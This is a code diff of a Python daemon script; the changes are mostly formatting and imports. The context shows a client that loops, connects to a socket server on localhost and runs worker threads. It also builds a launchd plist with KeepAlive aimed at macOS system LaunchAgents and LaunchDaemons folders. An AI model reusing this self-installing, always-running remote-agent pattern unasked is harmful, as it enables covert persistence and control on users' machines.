@@ -8,7 +8,7 @@ import shutil
 import time
 import json
 import threading
-from multiprocessing import Process
+import struct
 
 try:
     from StringIO import StringIO
@@ -18,6 +18,7 @@ except ImportError:
 HOST = 'localhost'
 PORT = 1708
 
+# Supporting classes
 
 class ByteLockBundler:
     def __init__(self, sock):
@@ -47,6 +48,8 @@ class ByteLockBundler:
             json_dict = json.dumps(outputdict)
             self.sock.sendall(json_dict.encode('UTF-8'))
 
+# Scripts
+
 def main():
     while True:
         if hasInternetConnection():
@@ -66,7 +69,6 @@ def main():
                 raise e
         # Try again in a minute
         time.sleep(60)
-
 
 def serve(sock):
     bytelock = ByteLockBundler(sock)
@@ -109,6 +111,7 @@ def serve(sock):
     t_sock.join()
     t_proc.join()
     t_bndl.join()
+
 
 def readSocket(sock, endchars='\n'):
     # TODO change to <packetlength><packet> format instead of newline separated
@@ -153,23 +156,23 @@ def hasInternetConnection():
 ###
 
 STARTUP_PLIST = ('<?xml version="1.0" encoding="UTF-8"?>' + '\n'
-                                                            '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
-                                                            '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">' + '\n'
-                                                                                                                  '<plist version="1.0">' + '\n'
-                                                                                                                                            '<dict>' + '\n'
-                                                                                                                                                       '\t' + '<key>Label</key>' + '\n'
-                                                                                                                                                                                   '\t' + '<string>pythondaemon</string>' + '\n'
-                                                                                                                                                                                                                            '\t' + '<key>ProgramArguments</key>' + '\n'
-                                                                                                                                                                                                                                                                   '\t' + '<array>' + '\n'
-                                                                                                                                                                                                                                                                                      '\t\t' + '<string>{python_path}</string>' + '\n'
-                                                                                                                                                                                                                                                                                                                                  '\t\t' + '<string>{script_path}</string>' + '\n'
-                                                                                                                                                                                                                                                                                                                                                                              '\t' + '</array>' + '\n'
-                                                                                                                                                                                                                                                                                                                                                                                                  '\t' + '<key>StandardErrorPath</key>' + '\n'
-                                                                                                                                                                                                                                                                                                                                                                                                                                          '\t' + '<string>/var/log/python_script.error</string>' + '\n'
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   '\t' + '<key>KeepAlive</key>' + '\n'
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   '\t' + '<true/>' + '\n'
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      '</dict>' + '\n'
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  '</plist>' + '\n')
+                '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
+                '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">' + '\n'
+                '<plist version="1.0">' + '\n'
+                '<dict>' + '\n'
+                '\t' + '<key>Label</key>' + '\n'
+                '\t' + '<string>pythondaemon</string>' + '\n'
+                '\t' + '<key>ProgramArguments</key>' + '\n'
+                '\t' + '<array>' + '\n'
+                '\t\t' + '<string>{python_path}</string>' + '\n'
+                '\t\t' + '<string>{script_path}</string>' + '\n'
+                '\t' + '</array>' + '\n'
+                '\t' + '<key>StandardErrorPath</key>' + '\n'
+                '\t' + '<string>/var/log/python_script.error</string>' + '\n'
+                '\t' + '<key>KeepAlive</key>' + '\n'
+                '\t' + '<true/>' + '\n'
+                '</dict>' + '\n'
+                '</plist>' + '\n')
 
 STARTUP_LOCS = ['/System/Library/LaunchAgents',
                 '/System/Library/LaunchDaemons',
